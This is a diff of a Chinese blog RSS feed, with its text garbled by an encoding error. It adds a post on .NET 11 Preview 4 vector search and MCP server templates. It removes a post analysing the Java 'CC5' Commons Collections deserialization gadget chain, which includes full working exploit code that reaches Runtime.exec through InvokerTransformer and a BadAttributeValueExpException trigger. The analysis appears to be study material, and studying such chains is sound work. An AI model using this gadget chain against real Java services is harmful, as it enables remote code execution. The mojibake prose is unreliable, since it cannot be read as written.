+// IEmbeddingGenerator æä¾äºç»ä¸çåµå¥çææ½è±¡
+IEmbeddingGenerator&lt;string, Embedding&lt;float&gt;&gt; embeddingGenerator = 
+    /* éç½® OpenAI æ Azure OpenAI æå¡ */;
+
+// ä¸ºææ¡£åå®¹çæåµå¥
+var embedding = await embeddingGenerator.GenerateVectorAsync(
+    "ææ¡£çå¨é¨åå®¹ææ¬...");
+
+// å­å¨å°æ°æ®åº
+context.Documents.Add(new Document 
+{ 
+    Title = "ææ¡£æ é¢", 
+    Content = "ææ¡£åå®¹", 
+    Embedding = new SqlVector&lt;float&gt;(embedding) 
+});
+await context.SaveChangesAsync();
+</code></pre>
+<p><strong>ç¬¬ä¸æ­¥ï¼æ§è¡åéç¸ä¼¼æ§æç´¢</strong></p>
+<pre><code class="language-csharp">// ä¸ºç¨æ·æ¥è¯¢çæåµå¥
+var queryEmbedding = await embeddingGenerator.GenerateVectorAsync(
+    "ç¨æ·è¾å¥çé®é¢");
+
+var sqlVector = new SqlVector&lt;float&gt;(queryEmbedding);
+
+// ä½¿ç¨ LINQ è¿è¡ç¸ä¼¼æ§æåº
+var topDocuments = await context.Documents
+    .OrderBy(d =&gt; EF.Functions.VectorDistance("cosine", d.Embedding, sqlVector))
+    .Take(5)
+    .ToListAsync();
+</code></pre>
+<p><code>VectorDistance</code> å½æ°æ¯æä¸åçè·ç¦»åº¦éï¼é¤äºâcosineâä½å¼¦è·ç¦»å¤ï¼è¿æ¯æâeuclideanâæ¬§æ°è·ç¦»åâdotâç¹ç§¯è·ç¦»ï¼å¼åèå¯ä»¥æ ¹æ®å·ä½åºæ¯éæ©åéçåº¦éæ¹å¼ãå¾®è½¯å®æ¹è¿ä»ç»äºæ´é«çº§çæ£ç´¢ç­ç¥ï¼âAzure SQL DB Vector Search ç¤ºä¾æ¼ç¤ºäºå¦ä½ä½¿ç¨åçåéå½æ°æå»ºæ£ç´¢ãæ··åæç´¢ãEF Core/SqlClient ç¨æ³ç­ï¼ä¸º RAG ç®¡éçç¬¬ä¸é¶æ®µæ£ç´¢æä¾åéç»æãâ</p>
+<h2 id="mcp-server-ai">äºãMCP Server æ¨¡æ¿ï¼AI åçåºç¨å¼åçâæåä¸å¬éâ</h2>
+<h3 id="mcp-ai">2.1 MCPï¼è®© AI æ¨¡åâä¼ç¨å·¥å·âçå¼æ¾æ å</h3>
+<p>Model Context Protocolï¼MCPï¼ç± Anthropic åèµ·ï¼å¾®è½¯å·²å å¥å¹¶å±åæ¨å¨å¶æä¸º AI é¢åçè¡ä¸æ åãç®åçè§£ï¼<strong>MCP æ¯ä¸º AI åºç¨è®¾è®¡çâUSB-C æ¥å£â</strong>ââæ ååäº AI æ¨¡åå¦ä½åç°åä½¿ç¨å¤é¨å·¥å·ä¸æ°æ®ã</p>
+<p>AI åºç¨è¦è®© LLM è°ç¨å¤é¨å½æ°ï¼ä»¥å¾å¼åèéè¦ä¸ºæ¯ä¸ªå¤§æ¨¡åå¹³å°åç¬ééå·¥å·è°ç¨æ ¼å¼ï¼è MCP ä¸º AI æ¨¡ååå¤é¨æå¡ä¹é´æä¾äºä¸ä¸ªæ ååçå¼æ¾åè®®ãå¾®è½¯å®æ¹è§£éï¼âMCP æå¡å¨æ¯éè¿ Model Context Protocolï¼MCPï¼åå®¢æ·ç«¯æ´é²è½åçæå¡ãâ</p>
+<p>å¾®è½¯ä¸ Anthropic åä½å¼åçå®æ¹ C# SDK å¨ 2026 å¹´ 3 æå·²åå¸ v1.0 ç¨³å®çæ¬ï¼å¨é¢æ¯æ 2025 å¹´ 11 æç MCP è§èï¼æä¸º MCP å®æ¹çæä¸­ç Tier 1 çº§å« SDKãè¿æå³ç .NET å¼åèç°å¨æ¥æä¸å¥çäº§å°±ç»ªçä¸æµå·¥å·åæ¥æå»º MCP æå¡å¨åå®¢æ·ç«¯ã</p>
+<h3 id="preview-4-mcp-server">2.2 Preview 4 çååï¼MCP Server æ¨¡æ¿æ­£å¼è½å°</h3>
+<p>.NET 11 Preview 4 å¼å¥äºä¸ä¸ªå¯¹ AI å¼åèèè¨æå·ä»·å¼çæ°ç¹æ§ââ<strong>MCP Server é¡¹ç®æ¨¡æ¿</strong>ãéè¿ <code>Microsoft.McpServer.ProjectTemplates</code> åå®è£åï¼å¼åèå¯ä»¥å¨ Visual Studio ä¸­ç´æ¥åå»º MCP Server App é¡¹ç®ã</p>
+<p>æ¨¡æ¿çæ°å»ºåå¯¼æä¾äºä¸°å¯çéç½®éé¡¹ï¼</p>
+<ul>
+<li><strong>ä¼ è¾ç±»å</strong>ï¼stdioï¼éç¨äºæ¬å° CLI å·¥å·éæï¼æ HTTPï¼éç¨äºè¿ç¨æå¡è°ç¨ï¼</li>
+<li><strong>Native AOT æ¯æ</strong>ï¼å¯å° MCP æå¡å¨ç¼è¯ä¸ºèªåå«çåçäºè¿å¶</li>
+<li><strong>ç¬ç«åå¸</strong>ï¼çæä¸ä¾èµ .NET è¿è¡æ¶çç¬ç«å¯æ§è¡æä»¶</li>
+</ul>
+<h3 id="mcp-server">2.3 å®æï¼ä¸æ­¥åå»ºç¬¬ä¸ä¸ª MCP Server</h3>
+<p>ä¸é¢æä»¬æ¥å¿«éä½éªä¸ä¸ª MCP Server çæå»ºè¿ç¨ã</p>
+<p><strong>ç¬¬ä¸æ­¥ï¼å®è£æ¨¡æ¿å¹¶åå»ºé¡¹ç®</strong></p>
+<p>å¨ç»ç«¯æ§è¡ä»¥ä¸å½ä»¤å®è£ MCP Server æ¨¡æ¿ï¼</p>
+<pre><code class="language-bash">dotnet new install Microsoft.McpServer.ProjectTemplates
+</code></pre>
+<p>ç¶ååå»ºæ°é¡¹ç®ï¼</p>
+<pre><code class="language-bash">dotnet new mcp-server -n MyCalculatorMcpServer
+</code></pre>
+<p>æèï¼å¨ Visual Studio çâæ°å»ºé¡¹ç®âçé¢ä¸­ï¼éæ© <strong>MCP Server App</strong> æ¨¡æ¿ï¼æåå¯¼éç½®å³å¯ã</p>
+<p><strong>ç¬¬äºæ­¥ï¼å®ç°å·¥å·ï¼Toolsï¼</strong></p>
+<p>MCP çæ ¸å¿æ¯âå·¥å·âââAI å¯è°ç¨çè½åååãå¨çæçæ¨¡æ¿ä»£ç ä¸­ï¼æ·»å ä¸ä¸ªç®åçè®¡ç®å·¥å·ï¼</p>
+<pre><code class="language-csharp">[McpTool("calculator")]
+public class CalculatorTool
+{
+    [McpTool("add")]
+    public int Add(
+        [McpToolParameter(Description = "ç¬¬ä¸ä¸ªå æ°")] int a,
+        [McpToolParameter(Description = "ç¬¬äºä¸ªå æ°")] int b) 
+        =&gt; a + b;
+    
+    [McpTool("multiply")]
+    public int Multiply(
+        [McpToolParameter(Description = "è¢«ä¹æ°")] int a,
+        [McpToolParameter(Description = "ä¹æ°")] int b) 
+        =&gt; a * b;
+}
+</code></pre>
+<p>æ³¨è§£é©±å¨çå®ä¹æ¹å¼è®© MCP å¼ååå¾éå¸¸ç´è§ãAI å®¢æ·ç«¯ï¼å¦ GitHub CopilotãClaude DesktopãVS Codeï¼å¯ä»¥éè¿ MCP åè®®èªå¨åç°è¿äºå·¥å·ï¼å¹¶å¨çæåç­æ¶æéè°ç¨ã</p>
+<p><strong>ç¬¬ä¸æ­¥ï¼æå»º MCP å®¢æ·ç«¯</strong></p>
+<p>æäº MCP Server ä¹åï¼è¿éè¦ä¸ä¸ªå®¢æ·ç«¯æ¥æ¶è´¹å®ãå¾®è½¯å®æ¹æä¾äºå®¢æ·ç«¯å¿«éå¥é¨ï¼åºæ¬ä»£ç ç»æå¦ä¸ï¼</p>
+<pre><code class="language-csharp">using ModelContextProtocol.Client;
+
+// å¯å¨ MCP å®¢æ·ç«¯è¿æ¥å°æå¡å¨
+var transport = new StdioClientTransport(new() 
+{ 
+    Command = "dotnet run",
+    Arguments = ["--project", "&lt;path-to-mcp-server&gt;"]
+});
+McpClient mcpClient = await McpClient.CreateAsync(transport);
+
+// ååºææå¯ç¨å·¥å·
+IList&lt;McpClientTool&gt; tools = await mcpClient.ListToolsAsync();
+
+// å° MCP å·¥å·ä½ä¸ºå½æ°è°ç¨è½åæ³¨å¥ AI èå¤©å®¢æ·ç«¯
+IChatClient chatClient = new ChatClientBuilder(openAIClient)
+    .UseFunctionInvocation()  // å¯ç¨å½æ°è°ç¨
+    .Build();
+
+// å¯¹è¯å¾ªç¯ï¼AI ä¼æéèªå¨è°ç¨ tools
+while (true)
+{
+    var userMessage = Console.ReadLine();
+    await foreach (var update in chatClient.GetStreamingResponseAsync(
+        messages, new() { Tools = tools }))
+    {
+        Console.Write(update);
+    }
+}
+</code></pre>
+<h3 id="mcp">2.4 MCP ççææ³è±¡</h3>
+<p>ä¸æ¦ä¼ä¸åé¨çä¸å¡ API éè¿ MCP Server æ´é²åºæ¥ï¼AI ç¼ç¨å©æï¼å¦ GitHub Copilotï¼å¯ä»¥ï¼</p>
+<ul>
+<li>å®æ¶æ¥è¯¢ä¼ä¸çè®¢åç¶æ</li>
+<li>åå»º Jira å·¥å</li>
+<li>æ¥è¯¢ KPI ä»ªè¡¨çæ°æ®</li>
+<li>çè³æ§è¡ CI/CD æµæ°´çº¿ä»»å¡</li>
+</ul>
+<p>æ­£å¦ä¸ä½ MCP å®è·µèæè¨ï¼âMCP æ­£å¨è¿éæä¸ºæ©å± AI æºè½ä½è½åçåºç³ï¼ç¨ C# æå»º MCP æå¡å¨ä»æªåç°å¨è¿æ ·ç®ååæä¸æãâ</p>
+<h2 id="ef-core-mcp-rag">ä¸ãå¼ºå¼ºèåï¼ç¨ EF Core åéæç´¢ + MCP æå»ºå®æ´ RAG åºç¨</h2>
+<p>çè§£äº EF Core çåéæç´¢å MCP Server æ¨¡æ¿ä¹åï¼ä¸ä¸ªé®é¢èªç¶æµ®ç°ââè¿ä¸¤èå¦ä½ååå·¥ä½ï¼ç­æ¡å°±æ¯ RAG åºç¨ã</p>
+<p>è®¾æ³ä¸ä¸ªä¼ä¸æºè½é®ç­åºæ¯ï¼</p>
+<h3 id="ef-core-1">3.1 æ°æ®åå¤ï¼ä½¿ç¨ EF Core åéå­å¨ï¼</h3>
+<p>ä¼ä¸åé¨æå¤§éäº§åææ¡£ãææ¯æåå FAQãé¦åï¼ä½¿ç¨ EF Core å°ææ¡£ååãçæåµå¥å¹¶å­å¥ SQL Server 2025ã</p>
+<pre><code class="language-csharp">// ææ¡£å¤çç®¡é
+foreach (var chunk in documentChunks)
+{
+    var embedding = await embeddingGenerator.GenerateVectorAsync(chunk.Content);
+    dbContext.DocumentChunks.Add(new DocumentChunk
+    {
+        Content = chunk.Content,
+        Metadata = chunk.Metadata,
+        Embedding = new SqlVector&lt;float&gt;(embedding)
+    });
+}
+await dbContext.SaveChangesAsync();
+</code></pre>
+<h3 id="mcp-ai-1">3.2 MCP å·¥å·åè£ï¼è®© AI è½æ£ç´¢ææ¡£ï¼</h3>
+<p>å°âææ¡£æ£ç´¢âè½ååè£ä¸º MCP å·¥å·ï¼</p>
+<pre><code class="language-csharp">[McpTool("document_search")]
+public class DocumentSearchTool
+{
+    private readonly AppDbContext _dbContext;
+    private readonly IEmbeddingGenerator _embeddingGenerator;
+    
+    [McpTool("search")]
+    public async Task&lt;List&lt;SearchResult&gt;&gt; SearchAsync(
+        [McpToolParameter(Description = "ç¨æ·çé®é¢ææ¥è¯¢")] string query)
+    {
+        var queryVector = await _embeddingGenerator.GenerateVectorAsync(query);
+        var sqlVector = new SqlVector&lt;float&gt;(queryVector);
+        
+        return await _dbContext.DocumentChunks
+            .OrderBy(d =&gt; EF.Functions.VectorDistance("cosine", d.Embedding, sqlVector))
+            .Take(5)
+            .Select(d =&gt; new SearchResult { Content = d.Content, Score = d.Similarity })
+            .ToListAsync();
+    }
+}
+</code></pre>
+<h3 id="ai-1">3.3 AI é®ç­æµç¨</h3>
+<p>å½ç¨æ·å¨ AI å©æçå¯¹è¯æ¡ä¸­æé®æ¶ï¼æµç¨å¦ä¸ï¼</p>
+<ol>
+<li>AI æ¨¡åè¯å«å°éè¦è°ç¨ <code>document_search</code> å·¥å·</li>
+<li>MCP åè®®è§¦å .NET åç«¯æ§è¡åéç¸ä¼¼æ§æç´¢</li>
+<li>æ£ç´¢å°çææ¡£åå®¹ä½ä¸ºä¸ä¸æè¿åç» AI</li>
+<li>å¤§è¯­è¨æ¨¡ååºäºæ£ç´¢ç»æçæåç¡®ãä¸ä¸æç¸å³çæç»åç­</li>
+</ol>
+<p>æ´ä¸ªè¿ç¨å¯¹ç¨æ·éæââä»ä»¬åªæç¥å°âAI è½åç¡®åç­å³äºäº§åçé®é¢âã</p>
+<h2 id="ai-preview-4">åãAI çæå¨æ¯ï¼é¤äº Preview 4ï¼è¿æåªäºéè¦æ¼å¾ï¼</h2>
+<p>Preview 4 ç AI éæåªæ¯ .NET AI æç¥çä¸ä¸ªç»æé¨åãåé¡¾åå²ï¼å¾®è½¯å¨ .NET çæä¸­å¸å± AI çæ·±åº¦è¿è¶å¤§å¤æ°å¼åèæè®¤ç¥ï¼</p>
+<table>
+<thead>
+<tr><th>ç»ä»¶</th><th>è¯´æ</th></tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Microsoft.Extensions.AI</strong></td>
+<td>æä¾ç»ä¸ç C# æ½è±¡å±ï¼æ¯æèå¤©æ¨¡åãåµå¥çæãå½æ°è°ç¨ç­ï¼å·²å¨ .NET 11 ä¸­è¿ä¸æ­¥æç</td>
+</tr>
+<tr>
+<td><strong>C# SDK for MCP</strong></td>
+<td>å®æ¹ C# å®ç°ï¼å·²åå¸ v1.0 ç¨³å®çï¼æ¯æ stdio å HTTP ä¼ è¾</td>
+</tr>
+<tr>
+<td><strong>Semantic Kernel</strong></td>
+<td>è½»éçº§ AI ç¼ææ¡æ¶ï¼æ¯ææä»¶åå¼åå Agent å·¥ä½æµ</td>
+</tr>
+<tr>
+<td><strong>.NET AI Templates</strong></td>
+<td>æä¾ AI èå¤© Web åºç¨èææ¶ï¼æ¯æå¤ç§ AI æå¡æä¾å</td>
+</tr>
+<tr>
+<td><strong>EF Core Vector Search</strong></td>
+<td>åçåéæç´¢æ¯æï¼SQL Server 2025 æä¾ DiskANN åéç´¢å¼å é</td>
+</tr>
+<tr>
+<td><strong>.NET Agent Framework</strong></td>
+<td>æ¯æå¤æ­¥éª¤æ¨çåå·¥å·è°ç¨å³ç­çæ°æ¡æ¶ï¼é¢è§ä¸­ï¼</td>
+</tr>
+</tbody>
+</table>
+<p>å¾®è½¯å° AI è½åæ­£å¼çº³å¥ .NET æ ¸å¿åºï¼ä½¿å¼åèè½å¤ç»ä¸è°ç¨å¤§æ¨¡åï¼æ¯æ OpenAI API / æ¬å°æ¨¡åï¼ï¼èä¸åå³å¿åååç SDK å·®å¼ï¼å¹¶å¯éæ¶åæ¢æ¨¡åã</p>
+<h2 id="section-2">äºãæ»ç»ä¸å±æ</h2>
+<p>.NET 11 Preview 4 å¨ AI å¼åæ¹åä¸çä¸¤å¤§æå½¹ï¼</p>
+<ol>
+<li>
+<p><strong>EF Core åéæç´¢</strong>ï¼å° RAG åºç¨çæ ¸å¿åºç¡è®¾æ½ââè¯­ä¹æ£ç´¢ââåçæ¥å¥ .NET å¼åèçæç ORM çæãåªééç½® <code>vector(1536)</code> ç±»ååä½¿ç¨ <code>VectorDistance</code> LINQ å½æ°ï¼å³å¯è½»æ¾æå»ºæ··åæç´¢æµæ°´çº¿ã</p>
+</li>
+<li>
+<p><strong>MCP Server æ¨¡æ¿</strong>ï¼è®© .NET å¼åèæ éçº ç»åè®®ç»èå°±è½ä¸º AI æºè½ä½æä¾æ ååãç±»åå®å¨çå·¥å·è°ç¨å¥å£ãæ­é Native AOT åå¸çè½åï¼MCP æå¡å¨å¯å®ç°æéå¯å¨åä½åå­å ç¨ã</p>
+</li>
+</ol>
+<p>äºèç»åèµ·æ¥ï¼.NET å¼åèå¯ä»¥ç¨<strong>æçæç C# ææ¯æ </strong>å»é©¾é©­ RAGãè¯­ä¹æç´¢ãAI Agent ç­åæ²¿ AI åºæ¯ï¼èä¸ç¨è½¬å Python æå¶ä»çæã</p>
+<p>æ­£å¦å¾®è½¯å®æ¹æè¨ï¼âåéæ°æ®ç±»ååè®¸å­å¨åµå¥ï¼è¿äºåµå¥æ¯æä¹çæ°å¼è¡¨ç¤ºï¼å¯ä»¥é«æå°è¿è¡ç¸ä¼¼æ§æç´¢ï¼ä¸ºè¯­ä¹æç´¢å RAG ç­ AI å·¥ä½è´è½½æä¾æ¯æãâè¿å¥è¯åç¡®æ¦æ¬äº .NET 11 AI æç¥çæ ¸å¿ï¼<strong>å° AI åºç¡è®¾æ½æ·±åº¦èå¥ .NET çåçå¼åä½éªï¼èéä½ä¸ºå­¤ç«çéå ç»ä»¶</strong>ã</p>
+<p>Preview 4 åªæ¯å¼å§ãéç .NET 11 æ­£å¼çå¨ 2026 å¹´ 11 æä¸´è¿ï¼æä»¬å¯ä»¥æå¾æ´å¤ç AI æ½è±¡ãæ´å®åçåéç´¢å¼æ¯æï¼å¦ DiskANN è¿è¿ä¼¼æç´¢ï¼ãä»¥åæ´æ·±åº¦ç LLM ç¼æè½åã</p>
+<p>å¯¹äº .NET å¼åèèè¨ï¼ç°å¨æ¯éªè¯è¿äºè½åå¹¶è§å AI æç¥çæä½³æ¶æºã<strong>AI å¼åçé£çæ¶ä»£å·²ç»å°æ¥ï¼è .NET æ­£å¨æä¸ºè¿åå¿«è½¦ä¸çå³é®å¼æã</strong></p>
+<p><strong>â ï¸ æ¸©é¦¨æé</strong>ï¼é¢è§çä»ä¾è¯ä¼°åæµè¯ä½¿ç¨ï¼è¯·å¿å¨çäº§ç¯å¢é¨ç½²ã</p>
+<p>ææ¯åå­ï¼ä¸ä¸ªåäºå­å¹´ .NET ä»£ç çç¨åºåã</p>
+<p>åæé¾æ¥ï¼<a href="https://www.codeobservatory.cn/Post/dotnet-11-preview-4-vector-search-mcp-template-ef-core-rag" rel="noopener nofollow">.NET 11 Preview 4 åçéæåéæç´¢ + MCP æ¨¡æ¿ï¼EF Core ç´æ¥å¯¹æ  RAG åºç¨ - ç ååå­çå¼åç¬è®°</a></p>
+
+</div>
+<div class="clear"></div>
+
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2026-05-16 17:45">2026-05-16 17:44</span>&nbsp;
+<a href="https://www.cnblogs.com/shenchuanchao">ç ååå­</a>&nbsp;
+éè¯»(<span id="post_view_count">0</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(20060331);return false;">æ¶è</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fshenchuanchao%2Fp%2F20060331%2Fdotnet-11-preview-4-vector-search-mcp-template-ef-core-rag&amp;targetId=20060331&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
+</div>
+         ]]>
+    </description>
+    </item>
+<item>
     <title><![CDATA[ åå«æå¨è®¡ç®ï¼SymPy åè¯ä¸ Manim èå¨ ]]></title>
     <link>https://www.cnblogs.com/wang_yb/p/20058938</link>
     <guid>7f0c02ba481fc50ddfdc9c3c179bcca4</guid>
@@ -1508,7 +1940,7 @@ y_value = float(expr.subs(x, x_value))  # è®¡ç®ä»»æç¹çå
             <div class="postDesc">posted @ 
 <span id="post-date" data-last-update-days="0" data-date-updated="2026-05-16 14:13">2026-05-16 14:12</span>&nbsp;
 <a href="https://www.cnblogs.com/wang_yb">wang_yb</a>&nbsp;
-éè¯»(<span id="post_view_count">0</span>)&nbsp;
+éè¯»(<span id="post_view_count">23</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(20058938);return false;">æ¶è</a>&nbsp;
@@ -1685,239 +2117,13 @@ y_value = float(expr.subs(x, x_value))  # è®¡ç®ä»»æç¹çå
 	<div class="postDesc">posted on 
 <span id="post-date" data-last-update-days="0" data-date-updated="2026-05-16 12:58">2026-05-16 12:57</span>&nbsp;
 <a href="https://www.cnblogs.com/yuxl01">yuyuyui</a>&nbsp;
-éè¯»(<span id="post_view_count">13</span>)&nbsp;
+éè¯»(<span id="post_view_count">85</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(19928139);return false;">æ¶è</a>&nbsp;
 <a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fyuxl01%2Fp%2F19928139&amp;targetId=19928139&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
 </div>
  ]]>
-    </description>
-    </item>
-<item>
-    <title><![CDATA[ CC5 ååºååé¾åæ ]]></title>
-    <link>https://www.cnblogs.com/ThorneYe/p/20058667</link>
-    <guid>d1df4e8c591c523b4228b0ff56f20f06</guid>
-    <description>
-    <![CDATA[ 
-            <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/ThorneYe/p/20058667" title="åå¸äº 2026-05-16 12:53">
-    <span role="heading" aria-level="2">CC5 ååºååé¾åæ</span>
-    
-
-</a>
-
-            </h1>
-            <div class="clear"></div>
-            <div class="postBody">
-                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
-<h1 id="cc5-ååºååé¾åæ">CC5 ååºååé¾åæ</h1>
-<h2 id="åè¨">åè¨</h2>
-<p>æ¬æéè¿åæä¸ä¸ªå®æ´ç CC5 å©ç¨é¾ä»£ç ï¼æ·±å¥çè§£å¶æé æè·¯åè§¦åæºå¶ãæä»¬å°ä½¿ç¨ä»¥ä¸ä»£ç è¿è¡å®éªï¼</p>
-<pre><code class="language-java">import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.LazyMap;
-
-import javax.management.BadAttributeValueExpException;
-import java.io.*;
-import java.lang.reflect.Field;
-import java.util.HashMap;
-import java.util.Map;
-
-public class CC5Test {
-    public static void main(String[] args) throws Exception {
-        // è¦æ§è¡çå½ä»¤ï¼æ ¹æ®ç³»ç»è°æ´ï¼
-        // String command = "calc.exe"; // Windows å¼¹åºè®¡ç®å¨
-        String command = "touch /tmp/cc5_success"; // Linux åå»ºæä»¶
-
-        // 1. æé æ¶æ Transformer é¾ï¼æ§è¡å½ä»¤ï¼
-        Transformer[] maliciousTransformers = new Transformer[]{
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod",
-                        new Class[]{String.class, Class[].class},
-                        new Object[]{"getRuntime", new Class[0]}),
-                new InvokerTransformer("invoke",
-                        new Class[]{Object.class, Object[].class},
-                        new Object[]{null, new Object[0]}),
-                new InvokerTransformer("exec",
-                        new Class[]{String.class},
-                        new Object[]{command}),
-                new ConstantTransformer(1)  // å ä½ï¼ä¸å½±åæ§è¡
-        };
-
-        // 2. åç¨ä¸ä¸ªæ å®³çé¾å ä½ï¼é²æ­¢å¨æé  LazyMap æ¶æå¤è§¦åï¼
-        Transformer dummyTransformer = new ConstantTransformer(1);
-        ChainedTransformer transformerChain = new ChainedTransformer(new Transformer[]{dummyTransformer});
-
-        // 3. åå»º LazyMapï¼å¶ factory æ¯ transformerChain
-        Map&lt;String, String&gt; innerMap = new HashMap&lt;&gt;();
-        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-
-        // 4. åå»º TiedMapEntryï¼ç»å® lazyMap åä¸ä¸ªä»»æ key
-        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
-
-        // 5. åå»º BadAttributeValueExpException å¯¹è±¡ï¼éè¿åå°è®¾ç½® val å­æ®µä¸º entry
-        BadAttributeValueExpException valException = new BadAttributeValueExpException(null);
-        Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
-        valField.setAccessible(true);
-        valField.set(valException, entry);
-
-        // 6. å° transformerChain ä¸­ç iTransformers æ¿æ¢ä¸ºçæ­£çæ¶æé¾ï¼æ­¤æ¶æ"ä¸è"ï¼
-        Field iTransformersField = ChainedTransformer.class.getDeclaredField("iTransformers");
-        iTransformersField.setAccessible(true);
-        iTransformersField.set(transformerChain, maliciousTransformers);
-
-        // 7. åºåå valException
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baos);
-        oos.writeObject(valException);
-        oos.close();
-
-        // 8. ååºåå ââ èªå¨è§¦åå½ä»¤æ§è¡
-        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
-        ObjectInputStream ois = new ObjectInputStream(bais);
-        ois.readObject();   // æ¼æ´è§¦åç¹
-        ois.close();
-
-        System.out.println("CC5 é¾æ§è¡å®æï¼è¯·æ£æ¥å½ä»¤æ¯å¦æ§è¡ã");
-    }
-}
-</code></pre>
-<h2 id="è¶åå­¦ä¹ badattributevalueexpexception-çè§¦åæºå¶">è¶åå­¦ä¹ ï¼<code>BadAttributeValueExpException</code> çè§¦åæºå¶</h2>
-<p>CC5 é¾çæ ¸å¿å¥å£æ¯ <code>BadAttributeValueExpException</code>ï¼ä½äº <code>javax.management</code> åï¼ãè¯¥ç±»å¨ååºååæ¶ï¼å¶ <code>readObject</code> æ¹æ³ä¼æ§è¡ä»¥ä¸å³é®æä½ï¼</p>
-<pre><code class="language-java">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
-    // ...
-    if (val == null) {
-        // ...
-    } else {
-        valObj = val.toString();   // å³é®ï¼å¯¹æååé val è°ç¨ toString()
-    }
-    // ...
-}
-</code></pre>
-<p>ä¹å°±æ¯è¯´ï¼å¦ææä»¬å¨ååºååæ¶è®© <code>val</code> æåä¸ä¸ªæä»¬å¯æ§çå¯¹è±¡ï¼é£ä¹è¯¥å¯¹è±¡ç <code>toString()</code> æ¹æ³å°±ä¼è¢«èªå¨è°ç¨ã</p>
-<h2 id="æ¼æ´åæ">æ¼æ´åæ</h2>
-<h3 id="1-æé éç¨æ¡¥æ¢cc5cc6-å±ç¨é¨å">1. æé éç¨æ¡¥æ¢ï¼CC5/CC6 å±ç¨é¨åï¼</h3>
-<pre><code class="language-java">// 1. æé æ¶æ Transformer é¾ï¼æ§è¡å½ä»¤ï¼
-Transformer[] maliciousTransformers = new Transformer[]{
-        new ConstantTransformer(Runtime.class),
-        new InvokerTransformer("getMethod", ...),
-        new InvokerTransformer("invoke", ...),
-        new InvokerTransformer("exec", ...),
-        new ConstantTransformer(1)  // å ä½ï¼ä¸å½±åæ§è¡
-};
-
-// 2. åç¨ä¸ä¸ªæ å®³çé¾å ä½ï¼é²æ­¢å¨æé  LazyMap æ¶æå¤è§¦åï¼
-Transformer dummyTransformer = new ConstantTransformer(1);
-ChainedTransformer transformerChain = new ChainedTransformer(new Transformer[]{dummyTransformer});
-
-// 3. åå»º LazyMapï¼å¶ factory æ¯ transformerChain
-Map&lt;String, String&gt; innerMap = new HashMap&lt;&gt;();
-Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-
-// 4. åå»º TiedMapEntryï¼ç»å® lazyMap åä¸ä¸ªä»»æ key
-TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
-</code></pre>
-<p>è¿é¨åæ¯ CC5 å CC6 é¾å±ç¨çâæ¡¥æ¢âï¼</p>
-<ul>
-<li><strong>æ¶æé¾</strong>ï¼<code>maliciousTransformers</code> æç»ä¼éè¿åå°æ§è¡ <code>Runtime.exec()</code>ï¼æ¯çæ­£æ§è¡å½ä»¤çé¨åã</li>
-<li><strong>å ä½é¾</strong>ï¼å¨æé  <code>LazyMap</code> å <code>TiedMapEntry</code> æ¶ï¼åç¨ä¸ä¸ªæ å®³ç <code>ConstantTransformer(1)</code> ä½ä¸º <code>ChainedTransformer</code> çåå®¹ï¼é²æ­¢æé è¿ç¨ä¸­æå¤è§¦åï¼è½ç¶æ¬é¾ä¸­æé è¿ç¨ä¸ä¼è§¦å <code>get</code>ï¼ä½ç»ä¸ä½¿ç¨å ä½é¾æ¯ä¸ç§é²å¾¡æ§ç¼ç¨ï¼ä¾¿äºåç»­æ¿æ¢ï¼ã</li>
-<li><strong>LazyMap</strong>ï¼å°æ®é <code>HashMap</code> åè£æ <code>LazyMap</code>ï¼å¹¶æè½½ <code>transformerChain</code>ãå½è°ç¨ <code>lazyMap.get(key)</code> ä¸ key ä¸å­å¨æ¶ï¼ä¼èªå¨æ§è¡ <code>transformerChain.transform(key)</code>ã</li>
-<li><strong>TiedMapEntry</strong>ï¼è¿ä¸ªç±»å®ç°äº <code>Map.Entry</code> æ¥å£ï¼å¶ <code>getValue()</code> æ¹æ³ä¼è¿å <code>map.get(key)</code>ãå æ­¤ï¼åªè¦è°ç¨ <code>entry.toString()</code> æ <code>entry.hashCode()</code>ï¼å°±ä¼é´æ¥è§¦å <code>lazyMap.get(key)</code>ã</li>
-</ul>
-<h3 id="2-æ ¸å¿">2. æ ¸å¿</h3>
-<pre><code class="language-java">// 5. åå»º BadAttributeValueExpException å¯¹è±¡ï¼éè¿åå°è®¾ç½® val å­æ®µä¸º entry
-BadAttributeValueExpException valException = new BadAttributeValueExpException(null);
-Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
-valField.setAccessible(true);
-valField.set(valException, entry);
-</code></pre>
-<p><strong>ä¸ºä»ä¹ä¼  <code>null</code>ï¼</strong></p>
-<p>æ¥ç <code>BadAttributeValueExpException</code> çæé æ¹æ³æºç ï¼</p>
-<pre><code class="language-java">public BadAttributeValueExpException(Object val) {
-    this.val = val == null ? null : val.toString();
